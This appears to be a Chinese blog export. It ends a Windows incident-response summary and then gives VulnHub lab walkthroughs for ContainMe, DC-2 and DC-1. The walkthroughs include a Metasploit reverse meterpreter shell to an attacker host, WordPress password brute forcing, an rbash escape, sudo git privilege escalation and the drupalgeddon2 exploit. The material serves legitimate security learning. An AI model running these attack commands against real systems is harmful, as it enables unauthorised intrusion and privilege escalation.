<h4 id="查看预读取文件"><a href="#查看预读取文件" class="headerlink" title="查看预读取文件"></a>查看预读取文件</h4><p>Win+R输入【%SystemRoot%\Prefetch】即可发现pf预读取文件</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/28.png"></p>
<p>另外，Amcache.hve【%SystemRoot%\appcompat\Programs 】文件可查询应用程序的执行路径、上次执行的时间及SHA1值</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/29.png"></p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/30.png"></p>
<h3 id="时间点查找"><a href="#时间点查找" class="headerlink" title="时间点查找"></a>时间点查找</h3><h4 id="可列出攻击日期内新增的文件，从而发现相关的恶意软件。"><a href="#可列出攻击日期内新增的文件，从而发现相关的恶意软件。" class="headerlink" title="可列出攻击日期内新增的文件，从而发现相关的恶意软件。"></a>可列出攻击日期内新增的文件，从而发现相关的恶意软件。</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forfiles /m *.zip /d +2022/5/30 /s /p c:\ /c &quot;cmd /c echo @path @fdate @ftime&quot; 2&gt;null</span><br></pre></td></tr></table></figure>

<p>很好用的命令 就是太长了记不住</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/31.png"></p>
<h4 id="对文件的创建时间、修改时间、访问时间进行排查"><a href="#对文件的创建时间、修改时间、访问时间进行排查" class="headerlink" title="对文件的创建时间、修改时间、访问时间进行排查"></a>对文件的创建时间、修改时间、访问时间进行排查</h4><p>hacker有时候为了掩人耳目会对时间进行修改，然而这种行为经不起推敲。</p>
<p>修改时间后，这三种时间会有逻辑上的问题，需要工程师留心注意。</p>
<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>不能判断哪个是webshell的话就上D盾，上云沙箱</p>
<p>或者看对外建立的链接，去查ip或者外联传输的情况。</p>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>分为系统日志，安全性日志，应用程序日志</p>
<p>除了windows系统日志，还可以对中间件日志，ftp日志，数据库日志进行相关分析</p>
<p>【这些东西有很多，笔者在此不多赘述，大家自行利用搜索引擎收集即可】</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/32.png"></p>
<h3 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h3><p>分析的话，主要是各种工具的使用，在此不多赘述。</p>
<p>市面上流行的商业软件都很不错，比如取证大师，火眼，盘古石等。</p>
<p>当然volatility等也是很优秀的（建议用2版本）</p>
<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>Wireshark是很棒的分析工具，1、要会抓包 2、要会分析（善用过滤器）简单分享几个我用的比较多的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.addr == ip    #过滤特定ip</span><br><span class="line">ip.src == ip     #过滤源ip</span><br><span class="line">ip.dst == ip     #过滤目的ip</span><br><span class="line">http、https、smtp、arp等协议直接输入即可筛选</span><br><span class="line">top.sort == 端口号 #对端口号进行过滤</span><br><span class="line">tcp contains xxx   #在数据包中筛查某一关键字</span><br><span class="line">arp.opcode==2     #过滤ARP应答帧</span><br><span class="line">arp.opcode==1     #过滤ARP请求帧</span><br><span class="line">http.response==1 &amp;&amp; http.response.code==200 #响应请求成功的包</span><br><span class="line">tcp.flags.ack==1&amp;&amp;tcp.flags.syn==1   #抓握手包</span><br></pre></td></tr></table></figure>

<h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><p>ip和域名网上多查查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x.threatbook.cn/  #微步平时也要闲着没事逛逛，说不定有意外惊喜呢</span><br><span class="line">https://ti.qianxin.com/   #奇安信威胁情报中心（个人认为做得非常好）</span><br><span class="line">https://ti.nsfocus.com/  #绿盟威胁情报云</span><br><span class="line">https://ti.360.com/#/homepage   #360威胁情报中心</span><br><span class="line">https://exchange.xforce.ibmcloud.com/ #IBM X-Force Exchange</span><br><span class="line">https://whois.chinaz.com/    #站长之家</span><br><span class="line">https://ip138.com/   #ip查询网</span><br><span class="line">http://www.scap.org.cn/   #VULHUB信息安全漏洞门户</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>遇见可疑文件有事儿没事儿了多找几个地方上传一下，气死红队（）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.virustotal.com/gui/home/upload  #virustotal</span><br><span class="line">https://s.threatbook.cn/   #微步云沙箱</span><br><span class="line">https://ata.360.cn/     #360安全大脑沙箱云</span><br><span class="line">https://habo.qq.com/  #腾讯哈勃系统</span><br><span class="line">https://sandbox.freebuf.com/detect?theme=freebuf  #大圣云沙箱（有点慢）</span><br></pre></td></tr></table></figure>

<p>总结的内容到这里就要结束了，当然整本书300+页，后面有很多经典案例分享，如挖矿木马，勒索病毒，流量劫持等等。总的来说，是一本非常可读的书，值得想了解应急响应的同学学习一番。这些也有可能给红队的同学一些小启发哟~</p>
<blockquote>
<p>若不去改变，明天永远只是今天的重演。</p>
</blockquote>
<hr>
]]></content>
  </entry>
  <entry>
    <title>靶机ContainMe: 1渗透记录</title>
    <url>/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机ContainMe: 1×1<br>渗透机kali 2021.2×1 和靶机在同一网段<br>靶机中等难度，有小挑战</p>
<blockquote>
<p>下载链接：<a href="https://www.vulnhub.com/entry/containme-1,729/">https://www.vulnhub.com/entry/containme-1,729/</a></p>
</blockquote>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>老规矩，确定靶机ip。先看mac地址</p>
<span id="more"></span>

<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>然后扫描确定ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定ip之后用nmap进行更深层次的信息探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.12</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>web服务开着，先去瞅一眼吧<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>这个界面没啥好说的，随便输了个目录发现了端倪<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>顺便看了看phpinfo的信息，是lxd容器<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"></p>
<blockquote>
<p>科普<a href="https://www.linuxprobe.com/lxd-2-0-introduce.html">https://www.linuxprobe.com/lxd-2-0-introduce.html</a></p>
</blockquote>
<p>再回到index.php这里 我们访问这里就会显示ls -al的结果，是不是有可能存在漏洞呢？<br>用wfuzz测试一下</p>
<blockquote>
<p>wfuzz是一款Python开发的Web安全模糊测试工具。可以用在做请求参数参数类的模糊测试，也可以用来做Web目录扫描等操作。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w /usr/share/dirb/wordlists/common.txt  -u &#x27;http://192.168.155.157/index.php?FUZZ=1&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w /usr/share/dirb/wordlists/common.txt  -u &#x27;http://192.168.155.157/index.php?FUZZ=a&#x27; --hh 329</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>找到了可以注入的地方。<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>咱现在整个就是一个赶紧上反弹shell的动作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set target PHP</span><br><span class="line">set lhost 192.168.155.128  #kali的ip</span><br><span class="line">show options</span><br><span class="line">run -j   #以后台的方式运行 sessions</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>生成的payload放到url中执行即可<br>【这张图是后来补的，所以ip变了，不要在意】<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>拿到sessions就可以进交互shell接着操作了<br>这里为了看着舒服又有Python打了交互shell(前提是靶机有Python环境)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;  </span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>进入用户目录，发现了一个可执行二进制文件<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>想要拿到这个文件可以利用刚才的网页漏洞拿出十六进制文件<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>用工具脱壳之后，用Ida打开可以发现hash字符串，输入了正确的字符串就可以拿到/bin/bash权限<br>所以把字符串复制到一个文本里用john去破解一下</p>
<blockquote>
<p>John the Ripper是一个快速的密码破解程序，kali安装自带，很好用的一款开源软件<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>接着输入./1cryptupx   mike即可<br>又跳到了另一个www-data权限的目录，接下来进行提权</p>
</blockquote>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/man/zh_TW</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>又发现一个二进制执行程序，好像跟之前那个是一样的<br>输入<code>./crypt mike</code>又跳转了，这回拿到了root权限<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>但事情好像没有那么简单，别忘了没跳出容器<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>这个时候可以用python httpserver传送文件了 可以传个nmap过来<br>扫描之后发现两个ip存活<br>分别是<code>172.16.20.2</code>和<code>172.16.20.6</code><br>而172.16.20.6的22ssh端口是开放的<br>在用户目录下发现了.ssh备份文件，于是直接用ssh -i连了上去。<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh mike@172.16.20.6 -i id_rsa</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png"><br>用ss命令看一下开放端口<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>【鸽了几天，又换了台kali,原谅俺这个大鸽子吧呜呜呜】<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/28.png"><br>发现了mysql数据库，尝试了几个弱口令（过程略）<br>标准做法其实是映射，然后爆破mysql数据库密码，这里推荐chisel轻量工具<br>拿到密码是password<br>接下来就是一套正常操作，查查查<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/29.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/30.png"><br>拿到了密码之后去切换到root用户<br>都到最后了还得给我使绊子是吧，不过这个压缩包的密码在数据库一并给出了，解开压缩包拿到flag<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/31.png"><br>至此，渗透结束。</p>
<hr>
<blockquote>
<p>人生只有走出来的美丽，没有等出来的辉煌</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>靶机渗透记录</category>
      </categories>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机DC-2的渗透记录</title>
    <url>/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<blockquote>
<p>下载地址<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p>
</blockquote>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>渗透机×1 kali2021.1<br>靶机DC-2×1 和渗透机在同一局域网<br>还有搜索引擎^_^</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开虚拟机 需要登录<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>话不多说，直接用从DC-1那里学来的本事，直接扫</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>还是看一眼mac地址 从而判断ip<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>接下来直接namp走一波</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -Pn -n 192.168.174.141</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>再来一次看看版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.174.141</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>嗯？开着80web服务端口 原本在22的ssh换了地方在7744<br>总之先去看看网页什么样子<br>又打开了一个win7的虚拟机 想看一下结果发现访问不成<br>搜索引擎探索了一下 这种情况可以尝试加个hosts<br>加了一下 然后可以打开了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"></p>
<h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag 1"></a>flag 1</h2><p>网页上直接有个flag<br>点击获得flag 1<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line">Your usual wordlists probably won&#x27;t work, so instead, maybe you justneed to be cewl.</span><br><span class="line">More passwords is always better, but sometimes you just can&#x27;t win themall.</span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line">lf you can&#x27;t find it, log in as another.</span><br></pre></td></tr></table></figure>

<h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag 2"></a>flag 2</h2><p>flag 1提示我们要用到cewl<br>上搜索引擎！</p>
<blockquote>
<p>字典生成工具Cewl使用全指南 <a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a><br>  <a href="https://www.codercto.com/a/44828.html">https://www.codercto.com/a/44828.html</a></p>
</blockquote>
<p>先来生成一个字典</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ -w dict.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>可以打开看一下<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>用wpscan扫一下看看能不能知道用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>3个用户 我们把他们加到user字典里 以防万一我密码字典也加一下 这样就可以开始爆破了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpsacn --url http://dc-2 -U user.txt  -P  dict.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>爆破出来了两个账号，没有admin，感觉后面可能要提权啊<br>wordpress的默认登录后台地址是url/wp-login.php<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>直接输入账号密码登录成功<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>打开pages界面即可发现flag<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>

<h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag 3"></a>flag 3</h2><p>另一个方式，应该指的是ssh<br>ssh尝试连接 jerry登不了但是tom可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh tom@192.168.174.141 -p 7744  #password:parturient</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>接下来我觉得应该是渗透过程中最难的环节了<br>我这个菜鸟啥也不懂 从搜索引擎那里学了好久<br>果然还有很多东西需要学习啊<br>连接上后发现不能cat flag<br>因为ssh远程连接到服务器的环境变量中不包含对应可执行文件的路径。<br>这个需要自行添加 需要绕过rbash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">/bin/bash</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>添加后即可查看flag 3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry.Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>

<h2 id="flag-4"><a href="#flag-4" class="headerlink" title="flag 4"></a>flag 4</h2><p>提示给了su 于是切换到用户jerry<br>目录也要跳出来<br>flag 4很轻松的就出来了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good to see that you &#x27;ve made it this far - but you &quot;re not home yet.</span><br><span class="line"></span><br><span class="line">You still need to get the final flag(the only flag that really counts!! !).No hints here - you &#x27;re on your own now. :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here! ! ! !</span><br></pre></td></tr></table></figure>
<h2 id="Final-flag"><a href="#Final-flag" class="headerlink" title="Final-flag"></a>Final-flag</h2><p>提示了git<br>这些我也不懂，但是之前刷ctf的入门题的时候提到过git相关的东西<br>文件配置不当从而给了我们提权的机会<br>执行sudo -l<br>可以发现不需要密码就能够执行<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>需要调整终端大小，使其一次性无法显示完这条命令的回显结果<br>在下面输入<code>!/bin/bash</code>即可 可以用whoami确认一下<br>跳出目录 就能获取Final-flag了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>总的来说，DC-2还算简单一些，有了之前的经验所以做起来更顺手也更快了<br>学到了很多的东西 收获颇多<br>目前来看，信息搜集和善用搜索引擎在渗透靶机的时候不可或缺</p>
<hr>
<blockquote>
<p>自觉此心无一事，小鱼跳出绿萍中。——姜夔· 《湖上寓居杂咏》</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>靶机渗透记录</category>
      </categories>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机DC-1的渗透记录</title>
    <url>/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>发现一个靶机，来学习一下</p>
<hr>
<blockquote>
<p>下载地址：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
</blockquote>
<hr>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>kali攻击机×1<br>靶机DC-1×1  靶机要和kali在同一个局域网里 </p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开虚拟机 发现需要登录<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>打开kali进入root用户 直接扫</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.5.png"><br>可以在设置里看一下渗透机的MAC地址 从而判断渗透机的ip是多少<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>上nmap 扫一下看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -Pn -n 192.168.174.128</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>我们可以看到 22 80 111 这些端口是开放的<br>80端口对应的是web服务 可以先去瞅瞅<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>百度了解一波↓↓↓</p>
<blockquote>
<p>Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成<br>然后，再来看看版本</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.174.128</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>使用的是Drupal 7<br>或者你也可以使用插件<code>wappalyzer</code></p>
<h2 id="Metasploit漏洞利用"><a href="#Metasploit漏洞利用" class="headerlink" title="Metasploit漏洞利用"></a>Metasploit漏洞利用</h2><p>接下来思路就很明了了 找一下相关的漏洞来利用<br>基于搜索引擎的某度黑客(#^.^#)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole  #启动</span><br><span class="line">search drupal #查找有关漏洞</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>某度找了一圈，发现有个Vulnerability（漏洞）正好针对Drupal 7<br>那么，接下来就是Exploit（漏洞利用）环节了<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use  exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">show options </span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>看来是可行的 返回了一个session<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.174.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
